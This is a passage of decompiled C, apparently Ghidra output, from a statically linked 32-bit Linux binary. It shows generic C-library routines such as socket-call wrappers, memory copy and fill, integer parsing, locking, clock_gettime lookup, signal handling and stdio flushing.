  uVar1 = thunk_FUN_08052b2b(0x66,5,&uStack_18,0,0,0,0,param_2);
  FUN_08052b50(uVar1);
  return;
}



void FUN_08053f34(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08052ae0();
  FUN_08052b50(uVar1);
  return;
}



void __regparm2
FUN_08053f88(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5)

{
  undefined4 uVar1;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  undefined4 uStack_8;
  undefined4 uStack_4;
  
  uStack_c = 0;
  uStack_8 = 0;
  uStack_4 = 0;
  uStack_18 = param_3;
  uStack_14 = param_4;
  uStack_10 = param_5;
  uVar1 = thunk_FUN_08052b2b(0x66,3,&uStack_18,0,0,0,0,param_2);
  FUN_08052b50(uVar1);
  return;
}



void FUN_08053fe0(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08052ae0();
  FUN_08052b50(uVar1);
  return;
}



void FUN_08054034(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08052ae0();
  FUN_08052b50(uVar1);
  return;
}



uint FUN_08054088(uint param_1)

{
  return param_1 << 0x18 | param_1 >> 0x18 | param_1 >> 8 & 0xff00 | (param_1 & 0xff00) << 8;
}



ushort FUN_080540b4(ushort param_1)

{
  return param_1 << 8 | param_1 >> 8;
}



void FUN_080541d4(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08052ae0();
  FUN_08052b50(uVar1);
  return;
}



uint FUN_08054228(uint param_1)

{
  return param_1 << 0x18 | param_1 >> 0x18 | param_1 >> 8 & 0xff00 | (param_1 & 0xff00) << 8;
}



ushort FUN_08054254(ushort param_1)

{
  return param_1 << 8 | param_1 >> 8;
}



void FUN_08054260(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_08054280(param_1,param_2,param_3,param_4,0,0);
  return;
}



void __regparm2
FUN_08054280(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  undefined4 uVar1;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  undefined4 uStack_8;
  undefined4 uStack_4;
  
  uStack_18 = param_3;
  uStack_14 = param_4;
  uStack_10 = param_5;
  uStack_c = param_6;
  uStack_8 = param_7;
  uStack_4 = param_8;
  uVar1 = thunk_FUN_08052b2b(0x66,0xc,&uStack_18,0,0,0,0,param_2);
  FUN_08052b50(uVar1);
  return;
}



void FUN_080542d8(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_080542f8(param_1,param_2,param_3,param_4,0,0);
  return;
}



void __regparm2
FUN_080542f8(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  undefined4 uVar1;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  undefined4 uStack_8;
  undefined4 uStack_4;
  
  uStack_18 = param_3;
  uStack_14 = param_4;
  uStack_10 = param_5;
  uStack_c = param_6;
  uStack_8 = param_7;
  uStack_4 = param_8;
  uVar1 = thunk_FUN_08052b2b(0x66,0xb,&uStack_18,0,0,0,0,param_2);
  FUN_08052b50(uVar1);
  return;
}



void FUN_08054350(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08052ae0();
  FUN_08052b50(uVar1);
  return;
}



int FUN_080543a4(undefined4 param_1,uint param_2)

{
  undefined4 uVar1;
  int iVar2;
  int *piVar3;
  int extraout_EDX;
  int extraout_EDX_00;
  
  uVar1 = FUN_08052ae0();
  iVar2 = FUN_08052b50(uVar1);
  if ((iVar2 < 0) &&
     (((piVar3 = (int *)FUN_080528b0(), *piVar3 == 0x16 ||
       (piVar3 = (int *)FUN_080528b0(), *piVar3 == 0x5d)) && ((param_2 & 0x80800) != 0)))) {
    uVar1 = FUN_08052ae0();
    iVar2 = FUN_08052b50(uVar1);
    if (-1 < iVar2) {
      if ((param_2 & 0x80000) != 0) {
        FUN_08052ae0();
        iVar2 = extraout_EDX;
      }
      if ((param_2 & 0x800) != 0) {
        FUN_08052ae0();
        iVar2 = extraout_EDX_00;
      }
    }
  }
  return iVar2;
}



void FUN_080544c4(void)

{
  return;
}



int FUN_080544c5(void)

{
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  undefined8 uVar4;
  undefined auStack_88 [128];
  
  FUN_080544c4(0xffffffff);
  FUN_0805459f(auStack_88);
  uVar1 = FUN_08052ae0();
  iVar2 = FUN_08052b50(uVar1);
  if (iVar2 == 0) {
    uVar4 = FUN_08052ae0();
    iVar3 = (int)((ulonglong)uVar4 >> 0x20);
    *(int *)(iVar3 + 0x1c) = (int)uVar4;
    *(undefined4 *)(iVar3 + 0x90) = 0;
    *(undefined4 *)(iVar3 + 0x8c) = 0;
    DAT_080578cc = 0;
  }
  FUN_080545be(auStack_88);
  FUN_080544c4(iVar2 == 0);
  return iVar2;
}



void FUN_08054550(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  thunk_FUN_08052b2b(0x8e,param_1,param_2,param_3,param_4,param_5,0);
  FUN_08052b50();
  return;
}



void FUN_08054580(void)

{
  FUN_08052ae0();
  return;
}



void FUN_0805459f(void)

{
  FUN_08052ae0();
  return;
}



void FUN_080545be(void)

{
  FUN_08052ae0();
  return;
}



void FUN_080545e0(void)

{
  FUN_08052ae0();
  FUN_08052b50();
  return;
}



undefined4 FUN_080545fc(void)

{
  undefined4 uVar1;
  undefined auStack_88 [128];
  
  FUN_08054580(auStack_88);
  FUN_08052ae0();
  uVar1 = FUN_08052ae0();
  uVar1 = FUN_08052b50(uVar1);
  FUN_080545be(auStack_88);
  return uVar1;
}



undefined8 FUN_08054654(int param_1,int param_2)

{
  uint uVar1;
  uint *puVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  undefined4 uStack_c;
  
  uVar1 = param_2 - 1;
  if ((uVar1 < 0x40) && (2 < param_2 - 0x20U)) {
    puVar2 = (uint *)(param_1 + (uVar1 >> 5) * 4);
    *puVar2 = *puVar2 | 1 << ((byte)uVar1 & 0x1f);
    uVar4 = 0;
  }
  else {
    puVar3 = (undefined4 *)FUN_080528b0();
    *puVar3 = 0x16;
    uVar4 = 0xffffffff;
  }
  return CONCAT44(uStack_c,uVar4);
}



undefined4 FUN_08054698(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  return 0;
}



undefined4 __regparm1 FUN_080546ac(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 auStack_11c [33];
  undefined4 uStack_98;
  undefined4 auStack_90 [35];
  
  FUN_0805492c(auStack_11c,0,0x8c,param_1);
  uStack_98 = 0x10000000;
  auStack_11c[0] = param_3;
  iVar1 = FUN_08055daa(param_2,auStack_11c,auStack_90);
  uVar2 = 0xffffffff;
  if (-1 < iVar1) {
    uVar2 = auStack_90[0];
  }
  return uVar2;
}



undefined8 FUN_08054710(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int *piVar2;
  undefined4 uStack_c;
  
  iVar1 = FUN_08054b04(param_1,param_2,param_3);
  if (iVar1 != 0) {
    piVar2 = (int *)FUN_080528b0();
    *piVar2 = iVar1;
    iVar1 = -1;
  }
  return CONCAT44(uStack_c,iVar1);
}



int FUN_08054740(char *param_1)

{
  char cVar1;
  bool bVar2;
  int iVar3;
  
  while( true ) {
    cVar1 = *param_1;
    if ((cVar1 != 0x20) && (4 < (int)cVar1 - 9U)) break;
    param_1 = param_1 + 1;
  }
  if (cVar1 == '+') {
    bVar2 = false;
  }
  else {
    bVar2 = false;
    if (cVar1 != '-') goto LAB_0805476d;
    bVar2 = true;
  }
  param_1 = param_1 + 1;
LAB_0805476d:
  iVar3 = 0;
  for (; (int)*param_1 - 0x30U < 10; param_1 = param_1 + 1) {
    iVar3 = iVar3 * 10 - ((int)*param_1 - 0x30U);
  }
  if (!bVar2) {
    iVar3 = -iVar3;
  }
  return iVar3;
}



undefined4 * FUN_080548bc(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  
  puVar1 = param_1;
  if (3 < param_3) {
    uVar2 = (uint)param_1 & 3;
    while (uVar2 != 0) {
      *(undefined *)param_1 = *(undefined *)param_2;
      param_3 = param_3 - 1;
      uVar2 = (uint)(undefined4 *)((int)param_1 + 1) & 3;
      param_1 = (undefined4 *)((int)param_1 + 1);
      param_2 = (undefined4 *)((int)param_2 + 1);
    }
  }
  for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
    *param_1 = *param_2;
    param_2 = param_2 + 1;
    param_1 = param_1 + 1;
  }
  for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {
    *(undefined *)param_1 = *(undefined *)param_2;
    param_2 = (undefined4 *)((int)param_2 + 1);
    param_1 = (undefined4 *)((int)param_1 + 1);
  }
  return puVar1;
}



undefined4 * FUN_080548f8(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined *puVar3;
  undefined *puVar4;
  
  if (param_3 <= (uint)((int)param_1 - (int)param_2)) {
    puVar1 = param_1;
    if (3 < param_3) {
      uVar2 = (uint)param_1 & 3;
      while (uVar2 != 0) {
        *(undefined *)param_1 = *(undefined *)param_2;
        param_3 = param_3 - 1;
        uVar2 = (uint)(undefined4 *)((int)param_1 + 1) & 3;
        param_1 = (undefined4 *)((int)param_1 + 1);
        param_2 = (undefined4 *)((int)param_2 + 1);
      }
    }
    for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
      *param_1 = *param_2;
      param_2 = param_2 + 1;
      param_1 = param_1 + 1;
    }
    for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {
      *(undefined *)param_1 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      param_1 = (undefined4 *)((int)param_1 + 1);
    }
    return puVar1;
  }
  puVar3 = (undefined *)((int)param_2 + (param_3 - 1));
  puVar4 = (undefined *)((int)param_1 + (param_3 - 1));
  for (; param_3 != 0; param_3 = param_3 - 1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + -1;
    puVar4 = puVar4 + -1;
  }
  return (undefined4 *)(puVar4 + 1);
}



int * FUN_0805492c(int *param_1,byte param_2,uint param_3)

{
  int iVar1;
  undefined2 uVar2;
  undefined4 uVar3;
  int *piVar4;
  
  if (param_3 < 0x3f) {
    if (param_3 != 0) {
      uVar2 = CONCAT11(param_2,param_2);
      *(byte *)param_1 = param_2;
      *(byte *)((int)param_1 + (param_3 - 1)) = param_2;
      if (2 < param_3) {
        *(undefined2 *)((int)param_1 + 1) = uVar2;
        *(undefined2 *)((int)param_1 + (param_3 - 3)) = uVar2;
        if (6 < param_3) {
          uVar3 = CONCAT22(uVar2,CONCAT11(param_2,param_2));
          *(undefined4 *)((int)param_1 + 3) = uVar3;
          *(undefined4 *)((int)param_1 + (param_3 - 7)) = uVar3;
          if (0xe < param_3) {
            *(undefined4 *)((int)param_1 + 7) = uVar3;
            *(undefined4 *)((int)param_1 + 0xb) = uVar3;
            *(undefined4 *)((int)param_1 + (param_3 - 0xf)) = uVar3;
            *(undefined4 *)((int)param_1 + (param_3 - 0xb)) = uVar3;
            if (0x1e < param_3) {
              *(undefined4 *)((int)param_1 + 0xf) = uVar3;
              *(undefined4 *)((int)param_1 + 0x13) = uVar3;
              *(undefined4 *)((int)param_1 + 0x17) = uVar3;
              *(undefined4 *)((int)param_1 + 0x1b) = uVar3;
              *(undefined4 *)((int)param_1 + (param_3 - 0x1f)) = uVar3;
              *(undefined4 *)((int)param_1 + (param_3 - 0x1b)) = uVar3;
              *(undefined4 *)((int)param_1 + (param_3 - 0x17)) = uVar3;
              *(undefined4 *)((int)param_1 + (param_3 - 0x13)) = uVar3;
            }
          }
        }
      }
    }
    return param_1;
  }
  iVar1 = (uint)param_2 * 0x1010101;
  *(int *)((int)param_1 + (param_3 - 4)) = iVar1;
  piVar4 = param_1;
  if (((uint)param_1 & 0xf) != 0) {
    *param_1 = iVar1;
    param_1[1] = iVar1;
    param_1[2] = iVar1;
    param_1[3] = iVar1;
    param_3 = param_3 - (-(int)param_1 & 0xfU);
    piVar4 = (int *)((int)param_1 + (-(int)param_1 & 0xfU));
  }
  for (param_3 = param_3 >> 2; param_3 != 0; param_3 = param_3 - 1) {
    *piVar4 = iVar1;
    piVar4 = piVar4 + 1;
  }
  return param_1;
}



void FUN_08054a2f(int *param_1)

{
  int iVar1;
  
  if (DAT_080578cc != 0) {
    while( true ) {
      LOCK();
      iVar1 = *param_1;
      *param_1 = 1;
      UNLOCK();
      if (iVar1 == 0) break;
      FUN_08054a70(param_1,param_1 + 1,1,1);
    }
  }
  return;
}



void thunk_FUN_08052b2b(void)

{
  FUN_08052b11(&stack0x00000018);
  return;
}



void thunk_FUN_08052b2b(void)

{
  FUN_08052b11(&stack0x00000018);
  return;
}



int FUN_08054a70(int *param_1,int *param_2,int param_3)

{
  int iVar1;
  int iStack_14;
  
  iVar1 = 100;
  while (iVar1 = iVar1 + -1, iVar1 != -1) {
    if ((param_2 != (int *)0x0) && (*param_2 != 0)) goto LAB_08054aba;
    if (*param_1 != param_3) {
      return iStack_14;
    }
  }
  if (param_2 != (int *)0x0) {
LAB_08054aba:
    LOCK();
    *param_2 = *param_2 + 1;
    UNLOCK();
  }
  while (*param_1 == param_3) {
    iStack_14 = FUN_08052ae0();
    if (iStack_14 == -0x26) {
      FUN_08052ae0();
    }
  }
  if (param_2 != (int *)0x0) {
    LOCK();
    *param_2 = *param_2 + -1;
    UNLOCK();
  }
  return iStack_14;
}



int FUN_08054b04(uint param_1,undefined4 param_2,uint *param_3)

{
  int iVar1;
  
  iVar1 = 0x16;
  if (param_1 < 3) {
    iVar1 = FUN_08052ae0();
    iVar1 = -iVar1;
    if ((iVar1 == 0) && (param_3 != (uint *)0x0)) {
      *param_3 = *param_3 & 0x7fffffff;
      param_3[1] = param_3[1] & 0xfffffffc;
    }
  }
  return iVar1;
}



int FUN_08054b40(void)

{
  int iVar1;
  int iStack_c;
  int iStack_8;
  
  iVar1 = FUN_08054b94(2,&iStack_c);
  if ((iVar1 == 0) && (iStack_c < 0x864)) {
    if (iStack_8 / 1000 <= iStack_c * -1000000 + 0x7fffffff) {
      return iStack_c * 1000000 + iStack_8 / 1000;
    }
  }
  return -1;
}



void __regparm3 FUN_08054b94(undefined4 param_1)

{
  code *pcVar1;
  
  if (DAT_08057590 == (code *)0x0) {
    pcVar1 = (code *)FUN_080558b0("LINUX_2.6","__vdso_clock_gettime",param_1,param_1);
    if (pcVar1 == (code *)0x0) {
      pcVar1 = (code *)&LAB_08054beb;
    }
    LOCK();
    if (DAT_08057590 != (code *)0x0) {
      pcVar1 = DAT_08057590;
    }
    DAT_08057590 = pcVar1;
    UNLOCK();
  }
                    // WARNING: Could not recover jumptable at 0x08054be9. Too many branches
                    // WARNING: Treating indirect jump as call
  (*DAT_08057590)();
  return;
}



undefined4 FUN_08054c4c(undefined4 *param_1)

{
  undefined4 auStack_c [2];
  
  FUN_08054b94(0,auStack_c);
  if (param_1 != (undefined4 *)0x0) {
    *param_1 = auStack_c[0];
  }
  return auStack_c[0];
}



void FUN_08054c78(void)

{
  FUN_08052ae0();
  FUN_08052b50();
  return;
}



undefined4 FUN_08054c90(undefined4 param_1)

{
  return param_1;
}



void FUN_08054c95(undefined4 param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08054c90(param_1);
  thunk_FUN_08052b2b(6,uVar1,0,0,0,0,0);
  FUN_08052b50();
  return;
}



void FUN_08054cd0(void)

{
  FUN_08052ae0();
  return;
}



void FUN_08054cdc(void)

{
  FUN_08052ae0();
  return;
}



void FUN_08054ce8(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  thunk_FUN_08052b2b(3,param_1,param_2,param_3,0,0,0);
  FUN_08052b50();
  return;
}



void FUN_08054d10(void)

{
  FUN_08052ae0();
  FUN_08052b50();
  return;
}



void FUN_08054d34(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08052ae0();
  FUN_08052b50(uVar1);
  return;
}



undefined4 FUN_08054d4c(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uStack_8;
  undefined4 uStack_4;
  
  uStack_4 = 0;
  uStack_8 = param_1;
  iVar1 = FUN_08055e94(&uStack_8,&uStack_8);
  uVar2 = 0;
  if (iVar1 != 0) {
    uVar2 = uStack_8;
  }
  return uVar2;
}



void FUN_08054d80(void)

{
  FUN_08052ae0();
  FUN_08052b50();
  return;
}



void FUN_08054d98(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  thunk_FUN_08052b2b(4,param_1,param_2,param_3,0,0,0);
  FUN_08052b50();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 FUN_08054dc0(undefined4 *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 uStack_c;
  
  iVar2 = DAT_08057904;
  puVar3 = param_1;
  if (DAT_080578f8 != 0) {
    iVar1 = _DAT_080578d4 + -0xd4;
    *param_1 = 1;
    puVar3 = (undefined4 *)(~(iVar2 - 1U) & (int)param_1 + iVar1);
    iVar2 = (int)puVar3 - DAT_08057900;
    puVar3[0x34] = param_1;
    puVar3[1] = param_1;
    param_1[1] = iVar2;
    FUN_080548bc(iVar2,DAT_080578f8,DAT_080578fc,param_1);
  }
  return CONCAT44(uStack_c,puVar3);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_08054e20(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  int *piVar3;
  int *piVar4;
  int iVar5;
  undefined *puVar6;
  undefined4 uStack_18;
  undefined4 uStack_14;
  
  piVar3 = (int *)0x0;
  iVar5 = 0;
  piVar4 = *(int **)(param_1 + 0xc);
  for (iVar1 = *(int *)(param_1 + 0x14); iVar1 != 0; iVar1 = iVar1 + -1) {
    if (*piVar4 == 6) {
      iVar5 = (int)*(int **)(param_1 + 0xc) - piVar4[2];
    }
    else if (*piVar4 == 7) {
      piVar3 = piVar4;
    }
    piVar4 = (int *)((int)piVar4 + *(int *)(param_1 + 0x10));
  }
  if (piVar3 != (int *)0x0) {
    DAT_080578fc = piVar3[4];
    DAT_080578f8 = iVar5 + piVar3[2];
    DAT_08057900 = piVar3[5];
    DAT_08057904 = piVar3[7];
  }
  DAT_08057900 = (-DAT_080578f8 - DAT_08057900 & DAT_08057904 - 1) + DAT_08057900;
  if (DAT_08057904 < 4) {
    DAT_08057904 = 4;
  }
  puVar6 = &DAT_08057598;
  _DAT_080578d4 = DAT_08057904 + 0xdf + DAT_08057900 & 0xfffffffc;
  if (0x118 < _DAT_080578d4) {
    uStack_18 = 0xffffffff;
    uStack_14 = 0;
    puVar6 = (undefined *)FUN_08052b11(&uStack_18);
  }
  iVar1 = FUN_08054dc0(puVar6);
  *(int *)iVar1 = iVar1;
  iVar5 = FUN_08055e3c(iVar1);
  if (-1 < iVar5) {
    if (iVar5 == 0) {
      _DAT_080578c0 = 1;
    }
    uVar2 = FUN_08052ae0();
    *(undefined4 *)(iVar1 + 0x1c) = uVar2;
    *(undefined **)(iVar1 + 0x9c) = &DAT_080578dc;
    *(int *)(iVar1 + 0x88) = iVar1 + 0x88;
    return;
  }
  do {
                    // WARNING: Do nothing block with infinite loop
  } while( true );
}



void FUN_08054f64(void)

{
  do {
    FUN_08052ae0();
  } while( true );
}



int FUN_080558b0(undefined4 param_1,undefined4 param_2)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int *piVar6;
  int *piVar7;
  int *piVar8;
  uint *puVar9;
  int *piVar10;
  uint uVar11;
  int *piVar12;
  int iStack_20;
  int *piStack_1c;
  int *piStack_18;
  int *piStack_14;
  
  iVar5 = 0;
  iVar3 = *DAT_080578d0;
  if (iVar3 == 0x21) {
LAB_080558e4:
    iVar3 = *(int *)(iVar5 + 4 + (int)DAT_080578d0);
    if (*(ushort *)(iVar3 + 0x2c) != 0) {
      piVar6 = (int *)(*(int *)(iVar3 + 0x1c) + iVar3);
      iVar5 = 0;
      puVar9 = (uint *)0x0;
      iStack_20 = -1;
      while( true ) {
        if (*piVar6 == 1) {
          iStack_20 = (piVar6[1] - piVar6[2]) + iVar3;
        }
        else if (*piVar6 == 2) {
          puVar9 = (uint *)(iVar3 + piVar6[1]);
        }
        if (iVar5 + 1U == (uint)*(ushort *)(iVar3 + 0x2c)) break;
        iVar5 = iVar5 + 1;
        piVar6 = (int *)((int)piVar6 + (uint)*(ushort *)(iVar3 + 0x2a));
      }
      if (((puVar9 != (uint *)0x0) && (iStack_20 != -1)) && (uVar2 = *puVar9, uVar2 != 0)) {
        piStack_1c = (int *)0x0;
        piStack_18 = (int *)0x0;
        piStack_14 = (int *)0x0;
        iVar3 = 8;
        iVar5 = 0;
        piVar6 = (int *)0x0;
        piVar12 = (int *)0x0;
        do {
          iVar4 = iVar3;
          piVar7 = (int *)(*(int *)((int)puVar9 + iVar5 + 4) + iStack_20);
          piVar10 = piVar6;
          piVar8 = piVar7;
          piVar1 = piStack_18;
          if (uVar2 != 6) {
            piVar8 = piVar12;
            if (uVar2 < 7) {
              piVar10 = piVar7;
              if ((uVar2 != 4) && (piVar10 = piVar6, uVar2 == 5)) {
                piStack_1c = piVar7;
              }
            }
            else {
              piVar1 = piVar7;
              if ((uVar2 != 0x6ffffff0) && (piVar1 = piStack_18, uVar2 == 0x6ffffffc)) {
                piStack_14 = piVar7;
              }
            }
          }
          piStack_18 = piVar1;
          uVar2 = *(uint *)(iVar4 + (int)puVar9);
          iVar3 = iVar4 + 8;
          iVar5 = iVar4;
          piVar6 = piVar10;
          piVar12 = piVar8;
        } while (uVar2 != 0);
        if (((piStack_1c != (int *)0x0) && (piVar8 != (int *)0x0)) && (piVar10 != (int *)0x0)) {
          uVar2 = (uint)piStack_18 & ~-(uint)(piStack_14 == (int *)0x0);
          if (piVar10[1] != 0) {
            uVar11 = 0;
            do {
              if ((((0x27 >> (*(byte *)(piVar8 + 3) & 0xf) & 1U) != 0) &&
                  ((0x406 >> (*(byte *)(piVar8 + 3) >> 4) & 1U) != 0)) &&
                 ((*(short *)((int)piVar8 + 0xe) != 0 &&
                  (iVar3 = FUN_08055e10(param_2,(int)piStack_1c + *piVar8), iVar3 == 0)))) {
                if (uVar2 == 0) {
LAB_08055ab1:
                  return iStack_20 + piVar8[1];
                }
                for (piVar6 = piStack_14;
                    ((*(byte *)((int)piVar6 + 2) & 1) != 0 ||
                    ((*(ushort *)(piVar6 + 1) & 0x7fff) !=
                     (*(ushort *)(uVar2 + uVar11 * 2) & 0x7fff)));
                    piVar6 = (int *)((int)piVar6 + piVar6[4])) {
                  if (piVar6[4] == 0) goto LAB_08055a07;
                }
                iVar3 = FUN_08055e10(param_1,*(int *)(piVar6[3] + (int)piVar6) + (int)piStack_1c);
                if (iVar3 == 0) goto LAB_08055ab1;
              }
LAB_08055a07:
              uVar11 = uVar11 + 1;
              piVar8 = piVar8 + 4;
            } while (uVar11 < (uint)piVar10[1]);
          }
        }
      }
    }
  }
  else {
    iVar5 = 8;
    while (iVar3 != 0) {
      iVar3 = *(int *)(iVar5 + (int)DAT_080578d0);
      if (iVar3 == 0x21) goto LAB_080558e4;
      iVar5 = iVar5 + 8;
    }
  }
  return 0;
}



int FUN_08055ac0(uint *param_1)

{
  uint uVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  undefined4 ***pppuStack_14;
  
  uVar4 = *param_1;
  if (uVar4 < 0x7ffff000) {
    uVar4 = (-uVar4 & 0xfff) + uVar4;
    if (DAT_080576b4 == (undefined4 ***)0x0) {
      iVar2 = FUN_08052ae0();
      DAT_080576b4 = (undefined4 ***)((-iVar2 & 0xfffU) + iVar2);
    }
    if (uVar4 < ~(uint)DAT_080576b4) {
      pppuStack_14 = DAT_080578d0;
      if ((((uVar4 + (int)DAT_080576b4 <=
             ((uint)(DAT_080578d0 + -0x200000) & ~-(uint)(DAT_080578d0 < (undefined4 ***)0x800001)))
           || (DAT_080578d0 <= DAT_080576b4)) &&
          ((pppuStack_14 = &pppuStack_14,
           uVar4 + (int)DAT_080576b4 <=
           ((uint)&stack0xff7fffec & ~-(uint)(pppuStack_14 < (undefined4 ***)0x800001)) ||
           (pppuStack_14 <= DAT_080576b4)))) &&
         (iVar2 = FUN_08052ae0(), iVar2 == uVar4 + (int)DAT_080576b4)) {
        *param_1 = uVar4;
        DAT_080576b4 = (undefined4 ***)iVar2;
        return iVar2 - uVar4;
      }
    }
    uVar1 = 0x1000 << ((byte)(DAT_080576b0 >> 1) & 0x1f);
    if (uVar4 < uVar1) {
      uVar4 = uVar1;
    }
    iVar2 = FUN_08053dc9();
    if (iVar2 == -1) {
      iVar2 = 0;
    }
    else {
      *param_1 = uVar4;
      DAT_080576b0 = DAT_080576b0 + 1;
    }
  }
  else {
    puVar3 = (undefined4 *)FUN_080528b0();
    *puVar3 = 0xc;
    iVar2 = 0;
  }
  return iVar2;
}



undefined4 FUN_08055daa(uint param_1,uint *param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 extraout_EDX;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined auStack_34 [8];
  uint uStack_2c;
  uint uStack_28;
  undefined *puStack_24;
  undefined auStack_20 [8];
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 in_stack_fffffff8;
  
  if (2 < param_1 - 0x20) {
    if (param_1 < 0x41) {
      if (param_2 != (uint *)0x0) {
        if (1 < *param_2) {
          in_stack_fffffff8 = 1;
          LOCK();
          *(uint *)(&DAT_080576bc + (param_1 - 1 >> 5) * 4) =
               *(uint *)(&DAT_080576bc + (param_1 - 1 >> 5) * 4) | 1 << ((byte)(param_1 - 1) & 0x1f)
          ;
          UNLOCK();
          if ((DAT_080578c4 == 0) && (DAT_080576b8 == 0)) {
            uStack_18 = 0;
            uStack_14 = 3;
            FUN_08052ae0();
            DAT_080576b8 = 1;
            in_stack_fffffff8 = extraout_EDX;
          }
        }
        uStack_2c = *param_2;
        uStack_28 = param_2[0x21] | 0x4000000;
        puStack_24 = &LAB_08055ec8;
        if ((*(byte *)(param_2 + 0x21) & 4) == 0) {
          puStack_24 = &DAT_08055ec0;
        }
        FUN_080548bc(auStack_20,param_2 + 1,8,in_stack_fffffff8);
      }
      uVar3 = FUN_08052ae0();
      iVar2 = FUN_08052b50(uVar3);
      uVar3 = 0xffffffff;
      if ((iVar2 == 0) && (uVar3 = 0, param_3 != (undefined4 *)0x0)) {
        *param_3 = uStack_40;
        param_3[0x21] = uStack_3c;
        FUN_080548bc(param_3 + 1,auStack_34,8,uStack_3c);
        uVar3 = 0;
      }
    }
    else {
      puVar1 = (undefined4 *)FUN_080528b0();
      uVar3 = 0xffffffff;
      *puVar1 = 0x16;
    }
    return uVar3;
  }
  uStack_10 = 0x8055dc7;
  puVar1 = (undefined4 *)FUN_080528b0();
  *puVar1 = 0x16;
  return 0xffffffff;
}



int FUN_08055e10(byte *param_1,byte *param_2)

{
  byte bVar1;
  
  bVar1 = *param_1;
  if (bVar1 == *param_2) {
    do {
      if (bVar1 == 0) break;
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      bVar1 = *param_1;
    } while (bVar1 == *param_2);
  }
  return (uint)*param_1 - (uint)*param_2;
}



int FUN_08055e3c(undefined4 param_1)

{
  code *pcVar1;
  int iVar2;
  undefined4 *extraout_ECX;
  
  pcVar1 = (code *)swi(0x80);
  iVar2 = (*pcVar1)(param_1,0xfffff,0x51);
  if (iVar2 == 0) {
    *extraout_ECX = param_1;
    iVar2 = 0;
  }
  else {
    pcVar1 = (code *)swi(0x80);
    iVar2 = (*pcVar1)();
    if (iVar2 == 0) {
      iVar2 = 1;
    }
  }
  return iVar2;
}



void FUN_08055e94(undefined4 param_1,undefined4 param_2)

{
  thunk_FUN_08052b2b(0xa2,param_1,param_2,0,0,0,0);
  FUN_08052b50();
  return;
}



undefined8 __regparm3 FUN_08055f40(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined8 uStack_c;
  
  if (param_1 != 0) {
    if (-1 < *(int *)(param_1 + 0x4c)) {
      FUN_0805602d(param_1);
      param_3 = extraout_ECX;
    }
    if (*(uint *)(param_1 + 0x1c) < *(uint *)(param_1 + 0x14)) {
      (**(code **)(param_1 + 0x24))(param_1,0,0,param_3);
    }
    if (*(uint *)(param_1 + 4) < *(uint *)(param_1 + 8)) {
      iVar1 = *(uint *)(param_1 + 4) - *(uint *)(param_1 + 8);
      (**(code **)(param_1 + 0x28))(param_1,iVar1,iVar1 >> 0x1f,1);
    }
  }
  return uStack_c;
}



void FUN_08055f8d(void)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)FUN_08055fcd();
  for (iVar2 = *piVar1; iVar2 != 0; iVar2 = *(int *)(iVar2 + 0x38)) {
    FUN_08055f40();
  }
  FUN_08055f40();
  FUN_08055f40();
  return;
}



undefined * FUN_08055fcd(void)

{
  FUN_08054a2f(&DAT_080576cc);
  return &DAT_080576c8;
}



undefined4 FUN_0805602d(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  int *in_GS_OFFSET;
  
  iVar1 = *(int *)(*in_GS_OFFSET + 0x1c);
